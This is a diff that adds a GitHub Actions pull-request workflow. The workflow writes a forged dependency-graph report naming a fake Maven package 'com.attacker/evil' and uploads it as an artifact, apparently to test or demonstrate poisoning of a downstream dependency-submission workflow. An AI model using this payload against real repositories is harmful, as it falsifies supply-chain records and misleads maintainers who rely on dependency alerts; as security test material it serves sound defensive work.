@@ -1,0 +1,17 @@
+name: PR Workflow
+on: pull_request
+jobs:
+  ok:
+    runs-on: ubuntu-latest
+    steps:
+      - name: write forged dependency graph obtained from the fork
+        run: |
+          mkdir -p dependency-graph-reports
+          printf '%s' '{"version":0,"sha":"8d8b99064c2ab211aeeb7af6336394c97a0b8424","ref":"refs/heads/main","manifests":{"attacker/pom.xml":{"name":"attacker/pom.xml","file":{"source_location":"attacker/pom.xml"},"resolved":{"evil-package":{"package_url":"pkg:maven/com.attacker/evil@1.0.0","relationship":"direct","scope":"runtime","dependencies":[]}}}}}' > dependency-graph-reports/evil.json
+          cat dependency-graph-reports/evil.json
+          echo
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: dependency-graph_evil.json
+          path: dependency-graph-reports/evil.json
+          if-no-files-found: error
